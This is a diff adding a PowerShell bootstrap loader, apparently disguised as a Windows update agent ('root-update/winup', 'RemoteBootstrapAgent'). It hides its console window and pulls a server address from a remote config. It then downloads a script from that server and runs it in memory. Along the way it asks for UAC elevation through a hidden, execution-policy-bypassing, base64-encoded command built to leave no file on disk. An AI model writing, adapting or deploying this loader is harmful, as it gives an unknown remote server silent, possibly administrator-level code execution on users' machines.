@@ -1,0 +1,361 @@
+param(
+    [Parameter(Mandatory = $true)][string]$ConfigUrl = "https://raw.githubusercontent.com/root-update/winup/refs/heads/main/windows.json",
+    # URL do proprio initial: elevacao UAC via -EncodedCommand + re-download, sem .ps1 em disco.
+    [string]$InitialScriptUrl = "",
+    [int]$RequestTimeoutSec = 10,
+    [switch]$ElevatedRun,
+    [int]$BootstrapWaitTimeoutSec = 720,
+    [switch]$ShowConsole
+)
+
+Set-StrictMode -Version Latest
+$ErrorActionPreference = "Stop"
+
+if ($RequestTimeoutSec -lt 3) { $RequestTimeoutSec = 3 }
+if ($BootstrapWaitTimeoutSec -lt 60) { $BootstrapWaitTimeoutSec = 60 }
+
+if (-not $ShowConsole) {
+    try {
+        Add-Type -Name W -Namespace H -MemberDefinition '[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int c);[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();' -ErrorAction SilentlyContinue
+        $null = [H.W]::ShowWindow([H.W]::GetConsoleWindow(), 0)
+    } catch {}
+}
+
+function Write-InitLog {
+    param([string]$Level, [string]$Message)
+    $ts = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
+    Write-Host "[$ts] [$Level] $Message"
+}
+
+function Get-JsonProp {
+    param($Object, [string]$Name)
+    if ($null -eq $Object) { return $null }
+    $p = $Object.PSObject.Properties[$Name]
+    if ($null -eq $p) { return $null }
+    return $p.Value
+}
+
+function Test-IsAdmin {
+    try {
+        $id = [Security.Principal.WindowsIdentity]::GetCurrent()
+        $p = New-Object Security.Principal.WindowsPrincipal($id)
+        return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    } catch {
+        return $false
+    }
+}
+
+function Get-ConfigJson {
+    param([string]$Url)
+    return Invoke-RestMethod -Uri $Url -Method Get -TimeoutSec $RequestTimeoutSec -ErrorAction Stop
+}
+
+function Select-ConfigEntry {
+    param($Cfg)
+
+    if ($null -eq $Cfg) { return $null }
+
+    $entries = @()
+    if ($Cfg -is [System.Array]) {
+        $entries = @($Cfg)
+    } else {
+        $servers = Get-JsonProp -Object $Cfg -Name "servers"
+        if ($servers -is [System.Array]) {
+            $entries = @($servers)
+        } elseif ($null -ne $servers) {
+            $entries = @($servers)
+        } else {
+            $singleServer = Get-JsonProp -Object $Cfg -Name "server"
+            if (-not [string]::IsNullOrWhiteSpace([string]$singleServer)) {
+                $entries = @($Cfg)
+            }
+        }
+    }
+
+    foreach ($s in $entries) {
+        if ($null -eq $s) { continue }
+        $enabled = Get-JsonProp -Object $s -Name "enabled"
+        if ($null -ne $enabled -and -not [bool]$enabled) { continue }
+        $server = [string](Get-JsonProp -Object $s -Name "server")
+        if ([string]::IsNullOrWhiteSpace($server)) { continue }
+        return $s
+    }
+
+    return $null
+}
+
+function Normalize-HostFromServer {
+    param([string]$ServerRaw)
+    if ([string]::IsNullOrWhiteSpace($ServerRaw)) { return "" }
+    $serverHost = $ServerRaw.Trim()
+    if ($serverHost -match '^[a-zA-Z][a-zA-Z0-9+\.-]*://') {
+        try {
+            $u = [Uri]$serverHost
+            if (-not [string]::IsNullOrWhiteSpace($u.Host)) {
+                $serverHost = $u.Host
+            }
+        } catch {}
+    }
+    if ($serverHost.Contains("/")) {
+        $serverHost = $serverHost.Split("/")[0]
+    }
+    return $serverHost
+}
+
+function Resolve-InstallBootstrapUrl {
+    param($Entry)
+    $serverRaw = [string](Get-JsonProp -Object $Entry -Name "server")
+    $serverHost = Normalize-HostFromServer -ServerRaw $serverRaw
+    if ([string]::IsNullOrWhiteSpace($serverHost)) { throw "Campo server ausente/invalido na config" }
+
+    $apiPort = 4000
+    $rawPort = Get-JsonProp -Object $Entry -Name "apiPort"
+    if ($null -ne $rawPort) {
+        $parsed = 0
+        if ([int]::TryParse([string]$rawPort, [ref]$parsed) -and $parsed -ge 1 -and $parsed -le 65535) {
+            $apiPort = $parsed
+        }
+    }
+
+    $installPath = [string](Get-JsonProp -Object $Entry -Name "installBootstrapPath")
+    if ([string]::IsNullOrWhiteSpace($installPath)) {
+        $installPath = "/agents/bootstrap/install"
+    } elseif (-not $installPath.StartsWith("/")) {
+        $installPath = "/" + $installPath
+    }
+
+    return "http://${serverHost}:$apiPort$installPath"
+}
+
+function Get-InstallBootstrapPayload {
+    param([string]$InstallUrl)
+    return Invoke-RestMethod -Uri $InstallUrl -Method Get -TimeoutSec $RequestTimeoutSec -ErrorAction Stop
+}
+
+function Resolve-InstallBootstrapScript {
+    param($Payload)
+
+    $script = [string](Get-JsonProp -Object $Payload -Name "installScript")
+    if ([string]::IsNullOrWhiteSpace($script)) {
+        $script = [string](Get-JsonProp -Object $Payload -Name "script")
+    }
+    if ([string]::IsNullOrWhiteSpace($script)) {
+        $script = [string](Get-JsonProp -Object $Payload -Name "code")
+    }
+    if (-not [string]::IsNullOrWhiteSpace($script)) {
+        return $script
+    }
+
+    throw "Payload remoto sem script em installScript/script/code"
+}
+
+function Get-InitialErrorLogPath {
+    $dir = Join-Path $env:ProgramData "RemoteBootstrapAgent"
+    if (-not (Test-Path -LiteralPath $dir)) {
+        try {
+            New-Item -ItemType Directory -Path $dir -Force | Out-Null
+        } catch {
+            $dir = $env:TEMP
+        }
+    }
+    return (Join-Path $dir "initial-install-error.log")
+}
+
+function Write-InitialElevatedFailure {
+    param([System.Management.Automation.ErrorRecord]$Err)
+    if (-not $ShowConsole) {
+        try {
+            $null = [Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 5)
+        } catch {}
+    }
+    $logFile = Get-InitialErrorLogPath
+    $body = @(
+        "=== $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ===",
+        $Err.Exception.ToString(),
+        "",
+        "InvocationInfo:",
+        ($Err.InvocationInfo | Out-String),
+        "",
+        "ScriptStackTrace:",
+        $Err.ScriptStackTrace
+    ) -join "`r`n"
+    try {
+        Add-Content -LiteralPath $logFile -Value $body -Encoding utf8
+    } catch {}
+    Write-Host ""
+    Write-Host "Falha na instalacao (admin). Mensagem:" -ForegroundColor Red
+    Write-Host $Err.Exception.Message -ForegroundColor Yellow
+    Write-Host ""
+    Write-Host "Log completo: $logFile" -ForegroundColor Cyan
+    Write-Host ""
+    Read-Host "Pressione Enter para fechar esta janela"
+}
+
+function Invoke-InstallBootstrapRunspace {
+    param(
+        [string]$ScriptText,
+        [string]$ConfigUrlValue
+    )
+
+    $runspace = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
+    $runspace.Open()
+    $ps = [System.Management.Automation.PowerShell]::Create()
+    $ps.Runspace = $runspace
+    try {
+        Write-InitLog "INFO" "Runspace bootstrap: iniciando script remoto (timeout max ${BootstrapWaitTimeoutSec}s)"
+        [void]$ps.AddScript($ScriptText).AddParameter("ConfigUrl", $ConfigUrlValue)
+        $async = $ps.BeginInvoke()
+        $startedAt = Get-Date
+        while (-not $async.IsCompleted) {
+            $null = $async.AsyncWaitHandle.WaitOne(5000)
+            if ($async.IsCompleted) { break }
+            $elapsed = [int]((Get-Date) - $startedAt).TotalSeconds
+            if ($elapsed -ge $BootstrapWaitTimeoutSec) {
+                try { $ps.Stop() } catch {}
+                throw "Bootstrap remoto excedeu timeout de ${BootstrapWaitTimeoutSec}s (provavel loop/bloqueio no script de install)"
+            }
+        }
+        [void]$ps.EndInvoke($async)
+        if ($ps.HadErrors) {
+            $errs = @($ps.Streams.Error | ForEach-Object { $_.ToString() }) -join " | "
+            throw "Erros no bootstrap runspace: $errs"
+        }
+        Write-InitLog "INFO" "Runspace bootstrap finalizado com sucesso"
+    } finally {
+        try { $ps.Dispose() } catch {}
+        try { $runspace.Close() } catch {}
+        try { $runspace.Dispose() } catch {}
+    }
+}
+
+try {
+    $cfg = Get-ConfigJson -Url $ConfigUrl
+    $entry = Select-ConfigEntry -Cfg $cfg
+    if ($null -eq $entry) {
+        $cfgType = if ($null -eq $cfg) { "null" } else { $cfg.GetType().FullName }
+        Write-InitLog "WARN" "Payload de config sem servidor valido (tipo=$cfgType)"
+        throw "Nenhum servidor valido na config"
+    }
+    $installUrl = Resolve-InstallBootstrapUrl -Entry $entry
+    Write-InitLog "INFO" "Install bootstrap url: $installUrl"
+
+    $payload = Get-InstallBootstrapPayload -InstallUrl $installUrl
+    $installScript = Resolve-InstallBootstrapScript -Payload $payload
+
+    if ((Test-IsAdmin) -or $ElevatedRun) {
+        Write-InitLog "INFO" "Executando script remoto em runspace (contexto admin/system)"
+        Invoke-InstallBootstrapRunspace -ScriptText $installScript -ConfigUrlValue $ConfigUrl
+        exit 0
+    }
+
+    if (-not $ElevatedRun) {
+        try {
+            $skipFileRunAs = $false
+
+            if (-not [string]::IsNullOrWhiteSpace($InitialScriptUrl)) {
+                $cuQ = $ConfigUrl.Replace("'", "''")
+                $isuQ = $InitialScriptUrl.Replace("'", "''")
+                $tail = if ($ShowConsole) { " -ShowConsole" } else { "" }
+                $launchOneLiner = "`$t=(New-Object System.Net.WebClient).DownloadString('$isuQ'); & ([ScriptBlock]::Create(`$t)) -ConfigUrl '$cuQ' -RequestTimeoutSec $RequestTimeoutSec -BootstrapWaitTimeoutSec $BootstrapWaitTimeoutSec -InitialScriptUrl '$isuQ' -ElevatedRun$tail"
+                $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($launchOneLiner))
+                if ($encoded.Length -le 7000) {
+                    Write-InitLog "INFO" "Pedido UAC: elevacao em memoria (-EncodedCommand; sem .ps1 em disco)"
+                    $encArgs = [System.Collections.Generic.List[string]]::new()
+                    $encArgs.Add("-NoProfile") | Out-Null
+                    $encArgs.Add("-ExecutionPolicy") | Out-Null
+                    $encArgs.Add("Bypass") | Out-Null
+                    if (-not $ShowConsole) {
+                        $encArgs.Add("-WindowStyle") | Out-Null
+                        $encArgs.Add("Hidden") | Out-Null
+                    }
+                    $encArgs.Add("-EncodedCommand") | Out-Null
+                    $encArgs.Add($encoded) | Out-Null
+                    $spEnc = @{
+                        FilePath     = "powershell.exe"
+                        ArgumentList = $encArgs.ToArray()
+                        Verb         = "RunAs"
+                        PassThru     = $true
+                        Wait         = $true
+                        ErrorAction  = "Stop"
+                    }
+                    if (-not $ShowConsole) { $spEnc["WindowStyle"] = "Hidden" }
+                    $pEnc = Start-Process @spEnc
+                    $skipFileRunAs = $true
+                    if ($pEnc.ExitCode -eq 0) { exit 0 }
+                    Write-InitLog "WARN" "Processo elevado (EncodedCommand) codigo $($pEnc.ExitCode). Log: $(Get-InitialErrorLogPath)"
+                } else {
+                    Write-InitLog "WARN" "EncodedCommand muito longo ($($encoded.Length)); a tentar -File"
+                }
+            }
+
+            if (-not $skipFileRunAs) {
+                $pathElev = $null
+                if (-not [string]::IsNullOrWhiteSpace($PSCommandPath) -and (Test-Path -LiteralPath $PSCommandPath)) {
+                    $pathElev = $PSCommandPath
+                } else {
+                    $mc = $MyInvocation.MyCommand
+                    if ($null -ne $mc -and $mc -is [System.Management.Automation.ExternalScriptInfo]) {
+                        $extp = [string]$mc.Path
+                        if (-not [string]::IsNullOrWhiteSpace($extp) -and (Test-Path -LiteralPath $extp)) {
+                            $pathElev = $extp
+                        }
+                    }
+                    if ($null -eq $pathElev -and $null -ne $mc -and $mc -is [System.Management.Automation.ScriptBlock]) {
+                        $txt = $mc.ToString()
+                        if (-not [string]::IsNullOrWhiteSpace($txt)) {
+                            $pathElev = Join-Path $env:TEMP ("RemoteInitial-elev-{0}.ps1" -f ([Guid]::NewGuid().ToString("n")))
+                            Set-Content -LiteralPath $pathElev -Value $txt -Encoding UTF8
+                            Write-InitLog "INFO" "Script em memoria: ficheiro temporario para UAC: $pathElev"
+                        }
+                    }
+                }
+                if ([string]::IsNullOrWhiteSpace($pathElev) -or -not (Test-Path -LiteralPath $pathElev)) {
+                    throw "Sem ficheiro .ps1 valido para elevacao UAC (defina -InitialScriptUrl ou execute a partir de .ps1)"
+                }
+
+                $elevArgs = [System.Collections.Generic.List[string]]::new()
+                $elevArgs.Add("-NoProfile") | Out-Null
+                if (-not $ShowConsole) {
+                    $elevArgs.Add("-WindowStyle") | Out-Null
+                    $elevArgs.Add("Hidden") | Out-Null
+                }
+                foreach ($x in @(
+                    "-ExecutionPolicy", "Bypass",
+                    "-File", $pathElev,
+                    "-ConfigUrl", $ConfigUrl,
+                    "-RequestTimeoutSec", "$RequestTimeoutSec",
+                    "-BootstrapWaitTimeoutSec", "$BootstrapWaitTimeoutSec",
+                    "-ElevatedRun"
+                )) { $elevArgs.Add($x) | Out-Null }
+                if ($ShowConsole) { $elevArgs.Add("-ShowConsole") | Out-Null }
+                if (-not [string]::IsNullOrWhiteSpace($InitialScriptUrl)) {
+                    $elevArgs.Add("-InitialScriptUrl") | Out-Null
+                    $elevArgs.Add($InitialScriptUrl) | Out-Null
+                }
+                $spArgs = @{
+                    FilePath     = "powershell.exe"
+                    ArgumentList = $elevArgs.ToArray()
+                    Verb         = "RunAs"
+                    PassThru     = $true
+                    Wait         = $true
+                    ErrorAction  = "Stop"
+                }
+                if (-not $ShowConsole) { $spArgs["WindowStyle"] = "Hidden" }
+                $p = Start-Process @spArgs
+                if ($p.ExitCode -eq 0) { exit 0 }
+                Write-InitLog "WARN" "Processo elevado encerrou com codigo $($p.ExitCode). Log de erro (se houver): $(Get-InitialErrorLogPath)"
+            }
+        } catch {
+            Write-InitLog "WARN" "Elevacao recusada/falhou. Fallback usuario."
+        }
+    }
+
+    Write-InitLog "INFO" "Executando script remoto em runspace (contexto usuario)"
+    Invoke-InstallBootstrapRunspace -ScriptText $installScript -ConfigUrlValue $ConfigUrl
+} catch {
+    if ($ElevatedRun -or (Test-IsAdmin)) {
+        Write-InitialElevatedFailure -Err $_
+        exit 1
+    }
+    throw
+}
